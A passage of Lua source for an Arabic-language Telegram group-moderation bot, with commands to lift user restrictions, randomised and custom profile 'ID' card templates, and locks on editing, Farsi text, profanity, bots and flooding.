HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevBrAnD:srem(BrAnD..'BrAnD:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevBrAnD:srem(BrAnD..'BrAnD:Ban:'..msg.chat_id_,result.sender_user_id_) DevBrAnD:srem(BrAnD..'BrAnD:Muted:'..msg.chat_id_,result.sender_user_id_)   
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
if text and text:match('^رفع القيود (%d+)') and Admin(msg) and ChCheck(msg) then 
local user = text:match('رفع القيود (%d+)') 
if tonumber(user) == tonumber(BrAnD) then  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = user},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لم استطع استخراج المعلومات', 1, 'md') 
return false  
end
ReplyStatus(msg,user,"reply","♰ ⌯ تم رفع قيوده")  
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevBrAnD:srem(BrAnD..'BrAnD:Tkeed:'..msg.chat_id_,user) DevBrAnD:srem(BrAnD..'BrAnD:Ban:'..msg.chat_id_,user) DevBrAnD:srem(BrAnD..'BrAnD:Muted:'..msg.chat_id_,user)   
end,nil)  
end
if text and text:match('^رفع القيود @(.*)') and Admin(msg) and ChCheck(msg) then  
local username = text:match('رفع القيود @(.*)')  
function unbanusername(extra,result,success)  
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')  
return false  
end
if result and result.type_ and result.type_.ChANnEl_ and result.type_.ChANnEl_.ID == "ChANnEl" then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ هذا معرف قناة وليس معرف حساب', 1, 'md') 
return false  
end
if tonumber(result.id_) == tonumber(BrAnD) then  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لم استطع استخراج المعلومات', 1, 'md') 
return false  
end
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم رفع قيوده")  
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevBrAnD:srem(BrAnD..'BrAnD:Tkeed:'..msg.chat_id_,result.id_) DevBrAnD:srem(BrAnD..'BrAnD:Ban:'..msg.chat_id_,result.id_) DevBrAnD:srem(BrAnD..'BrAnD:Muted:'..msg.chat_id_,result.id_)   
end,nil)   
end  
resolve_username(username,unbanusername) 
end 
--     SoUrCe BrAnD     --
if Manager(msg) then
if text and text:match("^تغيير الايدي$") and ChCheck(msg) or text and text:match("^تغير الايدي$") and ChCheck(msg) then 
local List = {
[[
゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .
゠𝙼𝚂𝙶 𖨈 #msgs 𖥲 .
゠𝚂𝚃𝙰 𖨈 #stast 𖥲 .
゠𝙸𝙳 𖨈 #id 𖥲 .
]],
[[
➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
]],
[[
⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑 ★
• 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂️ ☥
• 🖤 | 𝑰𝑫 : #id ‌‌‏♕
• 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
]],
[[
┌ 𝐔𝐒𝐄𝐑 𖤱 #username 𖦴 .
├ 𝐌𝐒𝐆 𖤱 #msgs 𖦴 .
├ 𝐒𝐓𝐀 𖤱 #stast 𖦴 .
└ 𝐈𝐃 𖤱 #id 𖦴 .
]],
[[
𓄼🇮🇶 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username 
𓄼🇮🇶 𝑺𝒕𝒂𝒔𝒕 : #stast 
𓄼🇮🇶 𝒊𝒅 : #id 
𓄼🇮🇶 𝑮𝒂𝒎𝒆𝑺 : #game 
𓄼🇮🇶 𝑴𝒔𝒈𝒔 : #msgs
]],
[[
➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
➞: 𝒖𝒔𝒆𝒓𓂅 #username 𓍯➸💞.
➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
➞: 𝒊𝒅 𓂅 #id 𓍯➸💞.
]],
[[
☆•𝐮𝐬𝐞𝐫 : #username 𖣬  
☆•𝐦𝐬𝐠  : #msgs 𖣬 
☆•𝐬𝐭𝐚 : #stast 𖣬 
☆•𝐢𝐝  : #id 𖣬
]],
[[
- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
- 𓏬 𝐈𝐃 : #id 𓂅 .
]],
[[
.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  
.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  
.𖣂 𝙡𝘿 , #id  
.𖣂 𝙂𝙖𝙢𝙨 , #game 
.𖣂 𝙢𝙨𝙂𝙨 , #msgs
]],
[[
♰ ⌯ 𝐔𝐒𝐄𝐑 ↬ #username 
♰ ⌯ 𝐈𝐃 ↬ #id
♰ ⌯ 𝐒𝐓𝐀𝐒𝐓 ↬ #stast
♰ ⌯ 𝐀𝐔𝐓𝐎 ↬ #cont 
♰ ⌯ 𝐌𝐀𝐒𝐆 ↬ #msgs
♰ ⌯ 𝐆𝐀𝐌𝐄 ↬ #game
]],
[[
ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇺🇸 ꙰
ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇺🇸 ꙰
ᯓ 𝗜𝗗 . #id 🇺🇸 ꙰
ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇺🇸 ꙰
ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇺🇸 ꙰
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➥• #username .
- ᴍѕɢѕ ➥• #msgs .
- ѕᴛᴀᴛѕ ➥• #stast .
- ʏᴏᴜʀ ɪᴅ ➥• #id  .
- ᴇᴅɪᴛ ᴍsɢ ➥• #edit .
- ᴅᴇᴛᴀɪʟs ➥• #auto . 
- ɢᴀᴍᴇ ➥• #game .
]]}
local Text_Rand = List[math.random(#List)]
DevBrAnD:set(BrAnD.."BrAnD:GpIds:Text"..msg.chat_id_,Text_Rand)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم تغير كليشة الايدي")  
end
--     SoUrCe BrAnD     --
if Sudo(msg) then
if text and text:match("^تعيين الايدي العام$") or text and text:match("^تعين الايدي العام$") or text and text:match("^تعيين كليشة الايدي$") then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ رجائا اتبع التعليمات للتعيين \n♰ ⌯ لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n⍆═════BR═════⍅\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n⍆═════BR═════⍅', 1, 'md')
DevBrAnD:set("BrAnD:New:id:"..BrAnD..msg.sender_user_id_,'BrAnDTEAM')
return "BrAnDTEAM"
end
if text and DevBrAnD:get("BrAnD:New:id:"..BrAnD..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم الغاء حفظ كليشة الايدي', 1, 'md')
DevBrAnD:del("BrAnD:New:id:"..BrAnD..msg.sender_user_id_)
return false
end
DevBrAnD:del("BrAnD:New:id:"..BrAnD..msg.sender_user_id_)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم حفظ كليشة الايدي العامه', 1, 'md')
DevBrAnD:set(BrAnD.."BrAnD:AllIds:Text",text)
return false
end
if text and text:match("^حذف الايدي العام$") or text and text:match("^مسح الايدي العام$") or text and text:match("^حذف كليشة الايدي$") then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف كليشة الايدي العامه")  
DevBrAnD:del(BrAnD.."BrAnD:AllIds:Text")
end
end
--     SoUrCe BrAnD     --
if text and text:match("^تعيين الايدي$") and ChCheck(msg) or text and text:match("^تعين الايدي$") and ChCheck(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ رجائا اتبع التعليمات للتعيين \n♰ ⌯ لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n⍆═════BR═════⍅\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n⍆═════BR═════⍅', 1, 'md')
DevBrAnD:set("BrAnD:New:id:"..BrAnD..msg.chat_id_..msg.sender_user_id_,'BrAnDTEAM')
return "BrAnDTEAM"
end
if text and Manager(msg) and DevBrAnD:get("BrAnD:New:id:"..BrAnD..msg.chat_id_..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم الغاء حفظ كليشة الايدي', 1, 'md')
DevBrAnD:del("BrAnD:New:id:"..BrAnD..msg.chat_id_..msg.sender_user_id_)
return false
end
DevBrAnD:del("BrAnD:New:id:"..BrAnD..msg.chat_id_..msg.sender_user_id_)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم حفظ الكليشه الجديده', 1, 'md')
DevBrAnD:set(BrAnD.."BrAnD:GpIds:Text"..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and ChCheck(msg) or text and text:match("^مسح الايدي$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف كليشة الايدي")  
DevBrAnD:del(BrAnD.."BrAnD:GpIds:Text"..msg.chat_id_)
end
end
--     SoUrCe BrAnD     --
if msg.reply_to_message_id_ ~= 0 then
return ""
else
if text and (text:match("^ايدي$") or text:match("^id$") or text:match("^Id$")) and ChCheck(msg) then
function BrAnDTEAM(extra,abbas,success)
if abbas.username_ then username = '@'..abbas.username_ else username = 'لا يوجد' end
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) ~= false then CustomTitle = GetCustomTitle(msg.sender_user_id_,msg.chat_id_) else CustomTitle = 'لا يوجد' end
local function getpro(extra, abbas, success) 
local msgsday = DevBrAnD:get(BrAnD..'BrAnD:UsersMsgs'..BrAnD..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local edit_msg = DevBrAnD:get(BrAnD..'BrAnD:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevBrAnD:get(BrAnD..'BrAnD:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local user_nkt = tonumber(DevBrAnD:get(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(DevBrAnD:get(BrAnD..'BrAnD:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local msguser = tonumber(DevBrAnD:get(BrAnD..'BrAnD:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local Texting = {"مو صوره ظيم بالنبي ،🤤💞","مقتنع بصورتك !؟ 😹🖤","ملاك وناسيك بكروبنه ،🤤💞","وفالله ،🤤💞","كشخه برب ،😉🤍","لزكت بيها دغيرها عاد ،😒😕","صورتك مامرتاحلها ،🙄😶","حلغوم والله ،🥺💘","مو صوره غنبله براسها ٦٠ حظ ،😹🤍"}
local Description = Texting[math.random(#Texting)]
if abbas.photos_[0] then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Id'..msg.chat_id_) then 
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Id:Photo'..msg.chat_id_) then 
if DevBrAnD:get(BrAnD.."BrAnD:AllIds:Text") then
newpicid = DevBrAnD:get(BrAnD.."BrAnD:AllIds:Text")
newpicid = newpicid:gsub('#username',(username or 'لا يوجد'))
newpicid = newpicid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
newpicid = newpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
newpicid = newpicid:gsub('#photos',(abbas.total_count_ or 'لا يوجد')) 
newpicid = newpicid:gsub('#game',(user_nkt or 'لا يوجد'))
newpicid = newpicid:gsub('#edit',(edit_msg or 'لا يوجد'))
newpicid = newpicid:gsub('#cont',(cont or 'لا يوجد'))
newpicid = newpicid:gsub('#msgs',(user_msgs or 'لا يوجد'))
newpicid = newpicid:gsub('#msgday',(msgsday or 'لا يوجد'))
newpicid = newpicid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
newpicid = newpicid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
newpicid = newpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
newpicid = newpicid:gsub('#Description',(Description or 'لا يوجد'))
else
newpicid = "♰ ⌯ "..Description.."\n♰ ⌯ معرفك ↫ ❨ "..username.." ❩\n♰ ⌯ ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n♰ ⌯ رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n♰ ⌯ رسائلك ↫ ❨ "..user_msgs.." ❩\n♰ ⌯ سحكاتك ↫ ❨ "..edit_msg.." ❩\n♰ ⌯ تفاعلك ↫ "..formsgs(msguser).."\n♰ ⌯ نقاطك ↫ ❨ "..user_nkt.." ❩\n⍆═════BR═════⍅\n"
end 
if not DevBrAnD:get(BrAnD.."BrAnD:GpIds:Text"..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, abbas.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = DevBrAnD:get(BrAnD.."BrAnD:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(abbas.total_count_ or '')) 
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#edit',(edit_msg or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'لا يوجد'))
local new_id = new_id:gsub('#msgday',(msgsday or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, abbas.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
end
else
if DevBrAnD:get(BrAnD.."BrAnD:AllIds:Text") then
newallid = DevBrAnD:get(BrAnD.."BrAnD:AllIds:Text")
newallid = newallid:gsub('#username',(username or 'لا يوجد'))
newallid = newallid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
newallid = newallid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
newallid = newallid:gsub('#photos',(abbas.total_count_ or 'لا يوجد')) 
newallid = newallid:gsub('#game',(user_nkt or 'لا يوجد'))
newallid = newallid:gsub('#edit',(edit_msg or 'لا يوجد'))
newallid = newallid:gsub('#cont',(cont or 'لا يوجد'))
newallid = newallid:gsub('#msgs',(user_msgs or 'لا يوجد'))
newallid = newallid:gsub('#msgday',(msgsday or 'لا يوجد'))
newallid = newallid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
newallid = newallid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
newallid = newallid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
newallid = newallid:gsub('#Description',(Description or 'لا يوجد'))
else
newallid = "♰ ⌯ معرفك ↫ ❨ "..username.." ❩\n♰ ⌯ ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n♰ ⌯ رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n♰ ⌯ رسائلك ↫ ❨ "..user_msgs.." ❩\n♰ ⌯ سحكاتك ↫ ❨ "..edit_msg.." ❩\n♰ ⌯ تفاعلك ↫ "..formsgs(msguser).."\n♰ ⌯ نقاطك ↫ ❨ "..user_nkt.." ❩"
end 
if not DevBrAnD:get(BrAnD.."BrAnD:GpIds:Text"..msg.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, newallid, 1, 'html')
else
local new_id = DevBrAnD:get(BrAnD.."BrAnD:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(abbas.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#edit',(edit_msg or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'لا يوجد'))
local new_id = new_id:gsub('#msgday',(msgsday or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
Dev_BrAnD(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')  
end
end
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ عذرا الايدي معطل ', 1, 'md')
end
else
if DevBrAnD:get(BrAnD.."BrAnD:AllIds:Text") then
notpicid = DevBrAnD:get(BrAnD.."BrAnD:AllIds:Text")
notpicid = notpicid:gsub('#username',(username or 'لا يوجد'))
notpicid = notpicid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
notpicid = notpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
notpicid = notpicid:gsub('#photos',(abbas.total_count_ or 'لا يوجد')) 
notpicid = notpicid:gsub('#game',(user_nkt or 'لا يوجد'))
notpicid = notpicid:gsub('#edit',(edit_msg or 'لا يوجد'))
notpicid = notpicid:gsub('#cont',(cont or 'لا يوجد'))
notpicid = notpicid:gsub('#msgs',(user_msgs or 'لا يوجد'))
notpicid = notpicid:gsub('#msgday',(msgsday or 'لا يوجد'))
notpicid = notpicid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
notpicid = notpicid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
notpicid = notpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
notpicid = notpicid:gsub('#Description',(Description or 'لا يوجد'))
else
notpicid = "♰ ⌯ لا استطيع عرض صورتك لانك قمت بحظر البوت او انك لاتمتلك صوره في بروفايلك\n⍆═════BR═════⍅\n♰ ⌯ معرفك ↫ ❨ "..username.." ❩\n♰ ⌯ ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n♰ ⌯ رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n♰ ⌯ رسائلك ↫ ❨ "..user_msgs.." ❩\n♰ ⌯ سحكاتك ↫ ❨ "..edit_msg.." ❩\n♰ ⌯ تفاعلك ↫ "..formsgs(msguser).."\n♰ ⌯ نقاطك ↫ ❨ "..user_nkt.." ❩\n⍆═════BR═════⍅\n"
end 
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Id'..msg.chat_id_) then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Id:Photo'..msg.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, notpicid, 1, 'html')
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ معرفك ↫ ❨ "..username.." ❩\n♰ ⌯ ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n♰ ⌯ رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n♰ ⌯ رسائلك ↫ ❨ "..user_msgs.." ❩\n♰ ⌯ سحكاتك ↫ ❨ "..edit_msg.." ❩\n♰ ⌯ رسائلك ↫ ❨ "..user_msgs.." ❩\n♰ ⌯ تفاعلك ↫ "..formsgs(msguser).."\n♰ ⌯ نقاطك ↫ ❨ "..user_nkt.." ❩", 1, 'md')
end
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ عذرا الايدي معطل', 1, 'md')
end end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
getUser(msg.sender_user_id_, BrAnDTEAM)
end
end 
--     SoUrCe BrAnD     --
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg) then
if text and text:match("^قفل (.*)$") then
local lockptf = {string.match(text, "^(قفل) (.*)$")}
if lockptf[2] == "التعديل" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل التعديل")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:EditMsgs'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ التعديل بالفعل مقفل في المجموعه', 1, 'md')
end
end
if lockptf[2] == "التعديل الميديا" or lockptf[2] == "تعديل الميديا" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل تعديل الميديا")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:EditMsgs'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تعديل الميديا بالفعل مقفل في المجموعه', 1, 'md')
end
end
if lockptf[2] == "الفارسيه" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل الفارسيه")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Farsi'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الفارسيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if lockptf[2] == "الفشار" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Fshar'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل الفشار")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Fshar'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الفشار بالفعل مقفل في المجموعه', 1, 'md')
end
end
if lockptf[2] == "الطائفيه" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل الطائفيه")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Taf'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الطائفيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if lockptf[2] == "الكفر" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل الكفر")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Kfr'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الكفر بالفعل مقفل في المجموعه', 1, 'md')
end
end
if lockptf[2] == "الفارسيه بالطرد" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل الفارسيه بالطرد")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:FarsiBan'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الفارسيه بالطرد بالفعل مقفله ', 1, 'md')
end
end
if lockptf[2] == "البوتات" or lockptf[2] == "البوتات بالحذف" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل البوتات بالحذف")  
DevBrAnD:set(BrAnD.."BrAnD:Lock:Bots"..msg.chat_id_,"del")  
end
if lockptf[2] == "البوتات بالطرد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل البوتات بالطرد")  
DevBrAnD:set(BrAnD.."BrAnD:Lock:Bots"..msg.chat_id_,"kick")  
end
if lockptf[2] == "البوتات بالتقييد" or lockptf[2] == "البوتات بالتقيد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل البوتات بالتقيد")  
DevBrAnD:set(BrAnD.."BrAnD:Lock:Bots"..msg.chat_id_,"ked")  
end
if lockptf[2] == "التكرار" or lockptf[2] == "التكرار بالحذف" then 
DevBrAnD:hset(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل التكرار بالحذف")  
end
if lockptf[2] == "التكرار بالطرد" then 
DevBrAnD:hset(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل التكرار بالطرد")  
end
if lockptf[2] == "التكرار بالتقيد" or lockptf[2] == "التكرار بالتقييد" then 
DevBrAnD:hset(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل التكرار بالتقيد")  
end
if lockptf[2] == "التكرار بالكتم" then 
DevBrAnD:hset(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل التكرار بالكتم")  
end
if BasicConstructor(msg) then
if lockptf[2] == "التثبيت" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Pin'..msg.chat_id_) then
tdcli_function ({ ID = "GetChANnElFull",  ChANnEl_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  DevBrAnD:set(BrAnD.."BrAnD:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل التثبيت")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Pin'..msg.chat_id_,true)
DevBrAnD:sadd(BrAnD.."BrAnD:Lock:Pinpin",msg.chat_id_) 
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ التثبيت بالفعل مقفل في المجموعه', 1, 'md')
end end end
end
end
end
--     SoUrCe BrAnD     --
if Admin(msg) then
